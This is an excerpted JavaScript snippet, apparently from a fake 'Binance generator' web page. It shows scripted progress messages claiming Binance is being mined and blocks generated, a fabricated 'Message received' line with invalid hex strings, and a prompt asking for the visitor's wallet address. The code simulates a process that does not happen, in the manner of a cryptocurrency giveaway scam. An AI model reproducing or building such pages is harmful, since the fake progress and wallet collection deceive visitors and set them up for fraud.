$(function () {
  ...
  var generator_messages = [
    ...
    { percentage: 40, message: "New Binance block generated!" },
    { percentage: 40, message: "New Binance block generated!" },
    { percentage: 40, message: "New Binance block generated!" },
    { percentage: 40, message: "New Binance block generated!" },
    { percentage: 43, message: "New Binance block generated!" },
    { percentage: 43, message: "New Binance block generated!" },
    { percentage: 43, message: "New Binance block generated!" },
    { percentage: 43, message: "New Binance block generated!" },
    { percentage: 45, message: "New Binance block generated!" },
    { percentage: 45, message: "New Binance block generated!" },
    ...
    { percentage: 50, message: "Reading Blockchain Head..." },
    {
      percentage: 55,
      message:
        "Message received: 0x23a56gbf856c2vk734gfgjnh432sasdd335dsg32 0x12e6cdE845de593d4b8D53aE9fcf1897795ed7",
    },
    ...
    { percentage: 70, message: "Binance block sucesfully generated..." },
    ...
    {
      percentage: 80,
      message: "Desired amount of Binance mined successfully",
    },
  ...
  $("#step1-submit").click(function (e) {
    ...
    if (wallet.length <= "34" || wallet.length >= "45") {
      alert("Please enter your correct Binance Smart Chain wallet address!");
      return;
    }
